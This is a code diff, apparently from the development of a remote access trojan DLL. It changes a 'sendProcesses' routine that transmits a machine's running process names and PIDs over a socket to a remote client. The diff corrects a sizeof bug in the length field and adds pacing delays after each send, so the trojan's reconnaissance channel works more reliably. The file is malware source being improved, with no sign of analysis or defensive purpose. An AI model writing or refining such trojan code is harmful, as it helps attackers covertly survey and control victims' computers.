@@ -189,11 +189,9 @@ INT sendProcesses(SOCKET clientSock, char** processNames, DWORD* processPIDs, IN
 		sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Sending process %s\n", process);
 		OutputDebugStringA(msgBuf);
 
-		Sleep(1000);
-
 		// Maybe send length of the string so we grab the correct number of bytes from the packet 
 		filenameSize = strlen(process);
-		status = send(clientSock, (const char*)&filenameSize, sizeof(strlen(process)), 0);
+		status = send(clientSock, (const char*)&filenameSize, sizeof(filenameSize), 0);
 		if (status == SOCKET_ERROR)
 		{
 			sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Failure recevied from send (process size %d) %d\n", filenameSize, WSAGetLastError());
@@ -201,6 +199,8 @@ INT sendProcesses(SOCKET clientSock, char** processNames, DWORD* processPIDs, IN
 			status = WSAGetLastError();
 			goto cleanup;
 		}
+
+		Sleep(1000);
 
 		status = send(clientSock, process, strlen(process), 0);
 		if (status == SOCKET_ERROR)
@@ -210,6 +210,8 @@ INT sendProcesses(SOCKET clientSock, char** processNames, DWORD* processPIDs, IN
 			status = WSAGetLastError();
 			goto cleanup;
 		}
+
+		Sleep(1000);
 
 		sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Sending PID %d\n", pid);
 		OutputDebugStringA(msgBuf);
@@ -222,6 +224,8 @@ INT sendProcesses(SOCKET clientSock, char** processNames, DWORD* processPIDs, IN
 			status = WSAGetLastError();
 			goto cleanup;
 		}
+
+		Sleep(1000);
 	}
 
 	status = SUCCESS;
